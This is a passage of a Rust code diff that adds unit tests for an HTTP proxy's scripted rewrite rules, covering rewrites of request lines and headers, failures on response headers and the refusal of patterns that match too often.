+        assert_eq!(String::from_utf8_lossy(&out.bytes), req.replacen("GET", "PUT", 1));
+        assert_eq!((out.ids(), out.failed.iter().map(|f| f.id).collect::<Vec<_>>()), (vec![9], vec![1, 2, 3]));
+        // Where every one of them succeeds, every one is rewritten.
+        let ok = "GET /a?q=ok&q=fine HTTP/1.1\r\nX-A: ok\r\nX-A: fine\r\nX-B: ok\r\n\r\n";
+        let out = set.request(Engine::Proxy, "h", ok.as_bytes().to_vec());
+        assert_eq!(
+            String::from_utf8_lossy(&out.bytes),
+            "PUT /a?q=new&q=new HTTP/1.1\r\nX-A: new\r\nX-A: new\r\nnew\r\n\r\n"
+        );
+        // Response headers alike.
+        let (mut cookie, dir_d) = scripted(4, RuleLocation::ResponseHeader, "", script);
+        cookie.name = Some("Set-Cookie".into());
+        let resp = "HTTP/1.1 200 OK\r\nSet-Cookie: ok\r\nSet-Cookie: bad\r\nContent-Length: 0\r\n\r\n";
+        let out = RuleSet::compile(&[cookie]).unwrap().response(Engine::Proxy, "h", resp.as_bytes().to_vec());
+        assert!(!out.changed() && out.failed.len() == 1, "{out:?}");
+        for dir in [dir_a, dir_b, dir_c, dir_d] {
+            let _ = std::fs::remove_dir_all(dir);
+        }
+    }
+
+    #[test]
+    fn a_pattern_that_matches_everywhere_is_refused_before_it_is_gathered() {
+        let (r, dir) = scripted(1, RuleLocation::ResponseBody, ".", "function replace(m) { return null; }");
+        let set = RuleSet::compile(&[r]).unwrap();
+        let respond = |n: usize| {
+            let resp = format!("HTTP/1.1 200 OK\r\nContent-Length: {n}\r\n\r\n{}", "a".repeat(n));
+            set.response(Engine::Proxy, "h", resp.into_bytes())
+        };
+        let out = respond(500);
+        assert!(out.failed.is_empty() && !out.changed(), "{out:?}");
+        let out = respond(MAX_MATCHES + 1);
+        assert!(!out.changed() && failed(&out)[0].1.contains("matches in too many places"), "{out:?}");
+        let _ = std::fs::remove_dir_all(dir);
     }
 }
